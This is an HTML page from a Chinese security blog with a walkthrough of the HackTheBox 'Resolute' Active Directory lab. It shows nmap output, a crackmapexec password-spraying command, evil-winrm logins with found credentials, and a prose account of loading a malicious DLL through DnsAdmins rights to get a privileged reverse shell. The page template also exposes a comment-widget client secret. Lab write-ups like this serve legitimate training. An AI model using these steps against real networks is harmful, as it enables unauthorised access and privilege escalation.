@@ -1,0 +1,318 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title> Active Directory 101-Resolute | white0123</title>
+<link rel="shortcut icon" href="https://wghahaha.github.io/favicon.ico?v=1714286336284">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://wghahaha.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title=" Active Directory 101-Resolute | white0123 - Atom Feed" href="https://wghahaha.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+这一台机器相比较前几台机器 更加简单 难点主要在于最后提权那里。
+信息收集
+Nmap scan report for 10.10.10.169
+Host is up (0.39s latency).
+Not shown: 65476 ..." />
+    <meta name="keywords" content="密码喷洒,dnsadmin,dll注入,AD域,HackTheBox" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://wghahaha.github.io">
+  <img class="avatar" src="https://wghahaha.github.io/images/avatar.png?v=1714286336284" alt="">
+  </a>
+  <h1 class="site-title">
+    white0123
+  </h1>
+  <p class="site-description">
+    永远保持第一天接触网络安全的热情
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+               Active Directory 101-Resolute
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-12-11
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://wghahaha.github.io/tag/6dYFZLNvP/" class="post-tag">
+                  # 密码喷洒
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/Sd1gOjj-sy/" class="post-tag">
+                  # dnsadmin
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/9kOqoBMpCg/" class="post-tag">
+                  # dll注入
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/ggcS95uZq/" class="post-tag">
+                  # AD域
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/4AeNKZQf4/" class="post-tag">
+                  # HackTheBox
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="前言">前言</h2>
+<p>这一台机器相比较前几台机器 更加简单 难点主要在于最后提权那里。</p>
+<h2 id="信息收集">信息收集</h2>
+<pre><code>Nmap scan report for 10.10.10.169
+Host is up (0.39s latency).
+Not shown: 65476 closed ports, 36 filtered ports
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-10-12 08:19:11Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGABANK)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+49674/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc        Microsoft Windows RPC
+49680/tcp open  msrpc        Microsoft Windows RPC
+49709/tcp open  msrpc        Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=10/12%Time=634676E0%P=x86_64-pc-linux-gnu%r(DNS
+SF:VersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
+SF:\x04bind\0\0\x10\0\x03&quot;);
+Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.02: 
+|_    Message signing enabled and required
+|_smb2-time: Protocol negotiation failed (SMB2)
+</code></pre>
+<h2 id="密码喷洒">密码喷洒</h2>
+<p>使用控身份连接到RPC</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211164027720.png" alt="image-20231211164027720" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211164059793.png" alt="image-20231211164059793" loading="lazy"></figure>
+<p>得到一组账号密码 尝试进行登陆。</p>
+<p>经过crackmapexec验证发现该用户不能登录，我们把前面发现的用户名都存入userlist.txt 然后使用crackmapexec进行密码喷洒</p>
+<pre><code>crackmapexec smb 10.10.10.169 -u userlist.txt -p 'Welcome123!' --continue-on-success
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1665921251_634bf0e3b0b5465c7da4f.png" alt="img" loading="lazy"></figure>
+<p>喷洒出可登录的用户 直接登录</p>
+<pre><code>evil-winrm -i 10.10.10.169 -P 5985 -u melanie -p 'Welcome123!'
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211164322432.png" alt="image-20231211164322432" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211164656637.png" alt="image-20231211164656637" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211164902807.png" alt="image-20231211164902807" loading="lazy"></figure>
+<p>发现了一个存有ryan用户名和密码的txt文件</p>
+<h2 id="dnsadmin组实现权限提升">dnsadmin组实现权限提升</h2>
+<p>我们通过这个账号密码 尝试进行登录。</p>
+<pre><code>evil-winrm -i 10.10.10.169 -P 5985 -u ryan -p 'Serv3r4Admin4cc123!'
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211165046789.png" alt="image-20231211165046789" loading="lazy"></figure>
+<p>成功进入。</p>
+<p>我们在ryan用户的桌面发现了一个note.txt文件，内容如下：</p>
+<pre><code>due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
+翻译：由于更改冻结，任何系统更改（除了管理员帐户的更改）将在 1 分钟内自动恢复
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211165209565.png" alt="image-20231211165209565" loading="lazy"></figure>
+<p>该组可以进行远程加载DLL 可通过构造恶意的DLL实现反弹shell</p>
+<p>https://3gstudent.github.io/backup-3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8dnscmd%E5%9C%A8DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDDll/</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211165405531.png" alt="image-20231211165405531" loading="lazy"></figure>
+<p>生成恶意的DLL马</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211165554161.png" alt="image-20231211165554161" loading="lazy"></figure>
+<p>远程加载恶意DLL以及重启DNS服务操作。</p>
+<p>注意：在实际的生产环境中重新DNS服务属于危险操作。</p>
+<p>观察反弹端口端的情况</p>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211165726735.png" alt="image-20231211165726735" loading="lazy"></figure>
+<p>成功反弹过一个高权限的shell 实现提权效果。</p>
+<p>还可以将恶意dll的操作设置为重置管理员密码 然后使用新的密码 进行横向操作。</p>
+<h2 id="总结">总结</h2>
+<p>这一台靶机相对比较轻松，最后提权那里对于DNSadmin不太熟悉，卡了一会。大概的思路就是 通过信息收集 和枚举通过空身份登录到RPC然后枚举出了一堆账号和一组密码 通过密码喷洒 得到一组可以登录的账号密码，成功登录上去。然后就是一顿翻，最后翻到隐藏文件中有一个txt写了ryan的账号密码 通过evil winrm成功登录上去后 发现该账号是DNS admin组的  该组可以实现远程调用DLL 然后使用MSF生成恶意的DLL 填好端口和IP信息 最后实现了反弹shell的效果 这个shell是一个高权限的shell 成功实现了反弹shell的操作</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
+<li><a href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92">密码喷洒</a></li>
+<li><a href="#dnsadmin%E7%BB%84%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">dnsadmin组实现权限提升</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://wghahaha.github.io/post/yu-nei-gong-fang-zhi-wei-pai-gong-ji/">
+              <h3 class="post-title">
+                域内攻防之委派攻击
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60a6742bb0cdc1129286',
+    clientSecret: '2c932a185a0c37b7924302f1ab242ffd3c186641',
+    repo: 'wghahaha.github.io',
+    owner: 'wghahaha',
+    admin: ['wghahaha'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  <div>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span>
+	<span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+  <a class="rss" href="https://wghahaha.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
